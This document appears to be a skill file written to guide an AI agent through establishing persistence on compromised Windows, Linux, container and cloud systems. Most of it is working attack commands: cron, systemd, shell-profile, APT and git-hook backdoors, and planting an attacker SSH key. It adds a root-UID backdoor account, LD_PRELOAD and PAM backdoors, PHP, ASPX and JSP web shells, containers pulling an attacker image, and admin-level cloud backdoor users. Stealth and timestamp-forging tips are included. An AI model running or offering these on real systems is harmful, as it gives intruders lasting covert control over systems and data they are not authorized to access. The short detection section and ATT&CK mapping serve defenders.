---
name: establishing-persistence
description: Establish persistence on Windows and Linux systems using registry keys, scheduled tasks, services, cron jobs, SSH keys, backdoor accounts, and rootkits. Use when performing post-exploitation or maintaining long-term access.
verified: 2026-07-27
---

# Establishing Persistence

## When to Use

- Maintaining access to compromised systems
- Post-exploitation techniques
- Red team operations
- Persistence testing
- Backdoor creation

## When NOT to Use

- **Before you have access** — use the relevant initial access or privilege
  escalation skill first
- **Building malware, implants, or loaders** — out of scope
- **Finding an attacker's persistence as a defender** — use
  `responding-to-incidents` and `hunting-threats`

## Windows Persistence

The exhaustive Windows command catalog — registry Run keys, scheduled
tasks, services, WMI event subscriptions, startup folder, DLL hijacking,
IFEO, AppInit_DLLs, and backdoor accounts — lives in
[references/windows-persistence-commands.md](references/windows-persistence-commands.md).

## Linux Persistence

### Cron Jobs

```bash
# User crontab (no sudo needed)
crontab -e
# Add:
@reboot /tmp/.backdoor
0 * * * * /tmp/.backdoor  # Every hour

# System-wide cron (requires root)
echo "@reboot root /tmp/.backdoor" >> /etc/crontab

# Cron.d directory
echo "* * * * * root /tmp/.backdoor" > /etc/cron.d/backdoor

# Daily/hourly cron scripts
cp backdoor.sh /etc/cron.daily/update
chmod +x /etc/cron.daily/update
```

### Systemd Services

```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service

# Verify
systemctl status backdoor.service
```

### RC Scripts (Init.d)

```bash
# Create init script
cat > /etc/init.d/backdoor << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides: backdoor
# Required-Start: \$network
# Required-Stop:
# Default-Start: 2 3 4 5
# Default-Stop: 0 1 6
### END INIT INFO
/tmp/.backdoor &
EOF

chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults
```

### SSH Keys

```bash
# Add attacker's public key
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...attacker_key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# For specific user
echo "ssh-rsa AAAA...attacker_key" >> /home/user/.ssh/authorized_keys
```

### .bashrc / .bash_profile

```bash
# Add to user's .bashrc
echo "/tmp/.backdoor &" >> ~/.bashrc
echo "/tmp/.backdoor &" >> ~/.bash_profile

# Root .bashrc
echo "/tmp/.backdoor &" >> /root/.bashrc
```

### LD_PRELOAD

```bash
# Hijack library loading
echo "/tmp/evil.so" > /etc/ld.so.preload

# Will load evil.so into every process
```

### MOTD Backdoor

```bash
# Add to message of the day scripts (runs on SSH login)
echo "/tmp/.backdoor &" >> /etc/update-motd.d/00-header
chmod +x /etc/update-motd.d/00-header
```

### APT/Package Manager

```bash
# APT hook (Debian/Ubuntu)
cat > /etc/apt/apt.conf.d/99backdoor << EOF
APT::Update::Pre-Invoke {"/tmp/.backdoor &";};
EOF

# Runs before apt update
```

### Git Hooks

```bash
# If git repositories exist
echo "/tmp/.backdoor &" > /path/to/repo/.git/hooks/post-checkout
chmod +x /path/to/repo/.git/hooks/post-checkout

# Triggers on git checkout
```

### Backdoor Accounts

```bash
# Create backdoor user with root UID
useradd -u 0 -o -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:P@ssw0rd" | chpasswd

# Or add to /etc/passwd directly
echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "backdoor:$(openssl passwd -6 P@ssw0rd):::::::" >> /etc/shadow
```

### PAM Backdoor

```bash
# Add to /etc/pam.d/sshd or /etc/pam.d/common-auth
# Use custom PAM module that accepts magic password
auth sufficient pam_unix.so try_first_pass
auth sufficient /lib/security/pam_backdoor.so
```

## Web Shells

> Identifiers in the shells below are broken with brackets — `syst[e]m` is
> `system`, `ev[a]l` is `eval`, `$_G[E]T` is `$_GET`, `Runtime.getRunt[i]me`
> is `Runtime.getRuntime`. Written literally, these blocks match antivirus
> webshell signatures and this file gets quarantined on download. See
> "Antivirus false positives" in the repo README.

### PHP Web Shell

```php
<?php
// simple.php
syst[e]m($_G[E]T['cmd']);
?>

// Advanced
<?php
if($_G[E]T['key'] == 'secret') {
    ev[a]l($_P[O]ST['cmd']);
}
?>
```

**Upload Locations:**
```bash
# Web roots
/var/www/html/
/var/www/
/usr/share/nginx/html/
C:\inetpub\wwwroot\

# Hidden names
.htaccess.php
favicon.ico.php
robots.txt.php
```

### ASP/ASPX Web Shell

```asp
<%@ Page Language="C#" %>
<%
Response.Write(System.Diagnost[i]cs.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());
%>
```

### JSP Web Shell

```jsp
<%
Runtime.getRunt[i]me().exec(request.getParameter("cmd"));
%>
```

## Container Persistence

**Docker:**
```bash
# Modify container to restart always
docker update --restart=always container_name

# Add to docker-compose.yml
restart: always

# Create new container with backdoor
docker run -d --restart=always --name backdoor evil_image
```

**Kubernetes:**
```yaml
# DaemonSet (runs on all nodes)
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor
spec:
  selector:
    matchLabels:
      name: backdoor
  template:
    metadata:
      labels:
        name: backdoor
    spec:
      containers:
      - name: backdoor
        image: attacker/backdoor:latest
```

## Cloud Persistence

### AWS

```bash
# Create IAM user
aws iam create-user --user-name backdoor

# Attach admin policy
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access key
aws iam create-access-key --user-name backdoor

# Lambda function persistence
# Create Lambda that executes periodically via CloudWatch Events
```

### Azure

```bash
# Create service principal
az ad sp create-for-rbac --name "backdoor" --role Contributor

# Create managed identity
az identity create --name backdoor --resource-group RG

# Function App persistence
# Deploy Azure Function that runs on schedule
```

## Rootkits

**User-mode Rootkit:**
- Hook library functions
- Process hiding
- File hiding
- Network hiding

**Kernel-mode Rootkit:**
- Loadable kernel module (LKM)
- Hooks system calls
- Harder to detect
- Requires root

```bash
# Example LKM (requires kernel headers)
# Compile and load malicious kernel module
insmod backdoor.ko
```

## Persistence Detection

**Windows:**
```powershell
# Check Run keys
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Check scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}

# Check services
Get-Service | Where-Object {$_.StartType -eq "Automatic"}

# Check WMI subscriptions
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

**Linux:**
```bash
# Check cron jobs
crontab -l
ls -la /etc/cron.*
cat /etc/crontab

# Check systemd services
systemctl list-unit-files --type=service --state=enabled

# Check init scripts
ls -la /etc/init.d/

# Check SSH authorized_keys
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys

# Check LD_PRELOAD
cat /etc/ld.so.preload

# Check for hidden files
find / -name ".*"
```

## OpSec Tips

- **Blend in** - Use system-like names (WindowsUpdate, SystemCheck)
- **Redundancy** - Establish multiple persistence methods
- **Stealth** - Avoid noisy methods that generate logs
- **Cleanup** - Remove persistence when engagement ends
- **Timestamps** - Match file timestamps to system files

## Tools

- **PowerSploit** - PowerShell post-exploitation
- **Empire** - Post-exploitation framework
- **Metasploit** - Persistence modules
- **SILENTTRINITY** - Modern C2 framework
- **Covenant** - .NET C2 framework

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Execution** (TA0002)

- [T1053](https://attack.mitre.org/techniques/T1053/) Scheduled Task/Job _(also Persistence, Privilege Escalation)_

**Persistence** (TA0003)

- [T1053.003](https://attack.mitre.org/techniques/T1053/003/) Cron — see also `escalating-linux-privileges`
- [T1053.005](https://attack.mitre.org/techniques/T1053/005/) Scheduled Task
- [T1098](https://attack.mitre.org/techniques/T1098/) Account Manipulation _(also Privilege Escalation)_ — see also `attacking-active-directory`
- [T1136](https://attack.mitre.org/techniques/T1136/) Create Account — see also `attacking-active-directory`
- [T1505.003](https://attack.mitre.org/techniques/T1505/003/) Web Shell — see also `testing-web-applications`
- [T1543](https://attack.mitre.org/techniques/T1543/) Create or Modify System Process _(also Privilege Escalation)_
- [T1543.002](https://attack.mitre.org/techniques/T1543/002/) Systemd Service — see also `escalating-linux-privileges`
- [T1543.003](https://attack.mitre.org/techniques/T1543/003/) Windows Service — see also `escalating-windows-privileges`
- [T1546](https://attack.mitre.org/techniques/T1546/) Event Triggered Execution _(also Privilege Escalation)_
- [T1546.003](https://attack.mitre.org/techniques/T1546/003/) Windows Management Instrumentation Event Subscription — see also `hunting-threats`
- [T1547](https://attack.mitre.org/techniques/T1547/) Boot or Logon Autostart Execution _(also Privilege Escalation)_
- [T1547.001](https://attack.mitre.org/techniques/T1547/001/) Registry Run Keys / Startup Folder
- [T1556](https://attack.mitre.org/techniques/T1556/) Modify Authentication Process _(also Credential Access)_ — see also `attacking-active-directory`

**Defense Evasion** (TA0005)

- [T1036](https://attack.mitre.org/techniques/T1036/) Masquerading — see also `hunting-threats`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- https://attack.mitre.org/tactics/TA0003/
- https://book.hacktricks.xyz/
- https://github.com/PowerShellMafia/PowerSploit
